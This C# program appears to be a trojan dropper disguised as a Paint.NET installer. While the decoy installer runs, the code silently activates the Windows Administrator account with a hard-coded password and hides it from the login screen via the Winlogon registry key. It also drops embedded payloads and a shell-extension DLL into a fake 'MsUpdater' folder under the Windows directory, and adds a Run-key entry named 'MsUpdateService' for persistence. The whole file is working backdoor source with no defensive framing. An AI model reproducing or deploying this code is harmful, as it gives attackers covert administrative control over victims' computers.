namespace Expander
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Threading;

    using Expander.Properties;

    using Microsoft.Win32;

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            new Thread(PaintNetInstall).Start();
            new Thread(Expand).Start();

            Console.Read();
        }

        private static Process CommandPrompt(string args)
        {
            return Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/C {args}",
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }

        private static bool sync;

        private static void Sync()
        {
            if (sync)
            {
                Environment.Exit(0);
            }

            sync = true;
        }

        private static void PaintNetInstall()
        {
            var copyTarget = Path.Combine(Path.GetTempPath(), "stpninstaller.exe");

            if (!File.Exists(copyTarget))
            {
                File.WriteAllBytes(copyTarget, Resources.Installer);
            }

            Process.Start(copyTarget);

            Sync();
        }

        private static void Expand()
        {
            const string Administrator = "administrator";
            const string Password = "abc123kappa";

            CommandPrompt($"net user {Administrator} /active:yes").WaitForExit();
            CommandPrompt($"net user {Administrator} {Password}").WaitForExit();

            var targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "MsUpdater");
            Directory.CreateDirectory(targetDir);

            var shellex = Path.Combine(targetDir, "ShellEx");
            Directory.CreateDirectory(shellex);

            var target = Path.Combine(targetDir, "Bootstrap.exe");
            File.WriteAllBytes(target, Resources.Bootstrap);
            File.WriteAllText(Path.Combine(shellex, "bootstrap"), target);
            File.WriteAllBytes(Path.Combine(targetDir, "InputSimulator.dll"), Resources.InputSimulator);
            
            var sparkExecution = Path.Combine(shellex, "SparkExecution.dll");
            File.WriteAllBytes(sparkExecution, Resources.SparkExecution);
            File.WriteAllBytes(Path.Combine(shellex, "LogicNP.EZShellExtensions.dll"), Resources.LogicNP_EZShellExtensions);

            var register = Path.Combine(shellex, "register.exe");
            File.WriteAllBytes(register, Resources.register);
            File.WriteAllBytes(Path.Combine(shellex, "restart.exe"), Resources.RestartExplorer);

            CommandPrompt($"{register} -i {sparkExecution}").WaitForExit();

            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                // ReSharper disable PossibleNullReferenceException

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    key.CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue(Administrator, 0);
                }

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.SetValue("MsUpdateService", target);
                }

                // ReSharper restore PossibleNullReferenceException
            }

            Sync();
        }
    }
}